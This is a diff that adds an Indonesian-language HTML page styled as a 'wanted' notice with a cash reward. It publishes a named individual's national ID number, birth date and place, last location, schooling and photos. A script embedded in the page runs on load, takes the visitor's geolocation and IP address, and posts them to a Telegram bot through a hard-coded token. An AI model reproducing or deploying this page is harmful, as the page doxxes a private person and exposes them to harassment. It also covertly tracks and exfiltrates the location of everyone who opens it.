@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+
+        body {
+            background-color: #0a0f0a;
+            color: #99ff99;
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 100%;
+            padding: 10px;
+            margin: 0 auto;
+        }
+
+        /* Responsive design */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 800px;
+            }
+        }
+
+        /* Warning Section */
+        .warning-section {
+            background: linear-gradient(145deg, #1a0000, #0a0f0a);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .warning-header {
+            color: #ff0000;
+            text-align: center;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .warning-text {
+            color: #ff6666;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .reward {
+            color: #ffff00;
+            text-align: center;
+            font-size: 1.1em;
+            margin-top: 10px;
+        }
+
+        /* KTP Section */
+        .ktp-section {
+            background: linear-gradient(145deg, #0a1f0a, #0a0f0a);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .ktp-header {
+            text-align: center;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 8px;
+        }
+
+        .ktp-header h1 {
+            color: #00ff00;
+            font-size: 1.2em;
+            letter-spacing: 2px;
+        }
+
+        .ktp-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+        }
+
+        .ktp-photo {
+            width: 100%;
+            height: auto;
+            border: 1px solid #00ff00;
+            background: #0a1f0a;
+        }
+
+        .ktp-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 0.9em;
+        }
+
+        @media (min-width: 600px) {
+            .ktp-content {
+                grid-template-columns: auto 1fr;
+                gap: 10px 15px;
+            }
+
+            .ktp-photo {
+                grid-row: span 6;
+                width: 170px;
+                height: 150px;
+            }
+        }
+
+        /* Marquee Section */
+        .marquee {
+            margin: 20px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            transition: all 5s;
+        }
+
+        .marquee-text {
+            display: inline-block;
+            padding-left: 100%;
+            animation: marquee 20s linear infinite;
+            color: #00ff00;
+            font-size: 1.1em;
+            font-weight: bold;
+        }
+
+        @keyframes marquee {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
+        }
+
+        .scanning-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #00ff00;
+            opacity: 0.5;
+            animation: scan 2s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+    </style>
+</head>
+<body>
+    d5046531@gmail.com
+    <div class="marquee">
+        <div class="marquee-text">JIKA MEMILIKI INFO TENTANG ORANG INI HUBUNGI  d5046531@gmail.com</div>
+    </div>
+    <div class="container">
+        <!-- Warning Section -->
+        <section class="warning-section">
+            <div class="warning-header">! WARNING !</div>
+            <div class="warning-text">DPO DARI KOMUNITAS JB</div>
+            <div class="warning-text">PENCARI RIPPER SE INDONESIA</div>
+            <div class="warning-text">KOMUNITAS HACK ACTIVITY INDONESIA</div>
+            <div class="reward">REWARD: Rp 500.000</div>
+            <div class="scanning-line"></div>
+        </section>
+
+        <!-- KTP Section -->
+        <section class="ktp-section">
+            <center>
+
+                <img src="data1.jpg" style="width: 600px;" alt="">
+            </center>
+            <div class="ktp-header">
+                <h1>[ IDENTITAS ]</h1>
+            </div>
+            <div class="ktp-content">
+                <div class="ktp-photo">
+                    <img src="data2.jpg" style="width: 100%; height: 100%;" alt="Foto">
+                </div>
+                <div class="ktp-item">
+                    <div class="ktp-label">NIK :</div>
+                    <div class="ktp-value">3301172810040001</div>
+                </div>
+                <div class="ktp-item">
+                    <div class="ktp-label">Nama :</div>
+                    <div class="ktp-value">	SAYID SABIQ INDRAZIDAN</div>
+                </div>
+                <div class="ktp-item">
+                    <div class="ktp-label">Tempat & tanggal lahir :</div>
+                    <div class="ktp-value">CILACAP 28-10-2004   </div>
+                </div>
+                <div class="ktp-item">
+                    <div class="ktp-label">Lokasi terakhir</div>
+                    <div class="ktp-value">Jakarta Ragency  </div>
+                </div>
+                <!-- Item KTP lainnya -->
+            </div>
+        </section>
+
+        <!-- Education Section -->
+        <section class="education-section">
+            <img src="data3.jpg" style="width: 100%;" alt="">
+            <div class="education-header">
+                <h1>[ RIWAYAT ]</h1>
+            </div>
+            <div class="education-timeline">
+                <div class="education-item">
+                    <div class="education-year">> 2021-2024</div>
+                    <div class="education-school">SMK 1 MUHAMMADIYAH SAMPANG</div>
+                    <div class="education-details">TEKNIK JARINGAN KOMPUTER TELEKOMINKASI 2</div>
+                </div>
+                <!-- Item pendidikan lainnya -->
+            </div>
+        </section>
+    </div>
+    <script>
+        const botToken = "7859928231:AAGqx6VLnkYe9GRCELYEOmFZg0YGhExGkjQ"; // Replace with your bot token
+
+        // Automatically call the function when the page loads
+        sendData();
+
+        async function fetchChatId() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+                const data = await response.json();
+                if (data.result.length > 0) {
+                    return data.result[data.result.length - 1].message.chat.id; // Get the latest chat_id
+                }
+            } catch (error) {
+                console.error("Error fetching chat ID:", error);
+            }
+            return null;
+        }
+
+        async function sendData() {
+            const errorDiv = document.getElementById("error");
+            const infoContainer = document.getElementById("infoContainer");
+
+            const chatId = await fetchChatId(); // Fetch the chat_id
+
+            if (!chatId) {
+                errorDiv.textContent = "Failed to retrieve chat ID. Please ensure you've interacted with the bot.";
+                errorDiv.style.display = "block";
+                return;
+            }
+
+            try {
+                // Get the user's location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                const currentDateTime = new Date().toLocaleString("id-ID");
+
+                // Fetch the user's IP address
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+
+                // Prepare the message to send to Telegram
+                const message = `Location: ${position.coords.latitude}, ${position.coords.longitude}\n` +
+                                `Time: ${currentDateTime}\n` +
+                                `IP Address: ${ipData.ip}`;
+
+                // Send message to Telegram
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+
+                if (response.ok) {
+                    errorDiv.style.display = "none";
+                    document.getElementById("location").textContent = 
+                        `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
+                    document.getElementById("datetime").textContent = 
+                        `Time: ${currentDateTime}`;
+                    document.getElementById("ipaddress").textContent = 
+                        `IP Address: ${ipData.ip}`;
+                    infoContainer.style.display = "block";
+                } else {
+                    throw new Error("Failed to send message to Telegram.");
+                }
+            } catch (error) {
+                errorDiv.textContent = "Failed to get information or send data.";
+                errorDiv.style.display = "block";
+                infoContainer.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
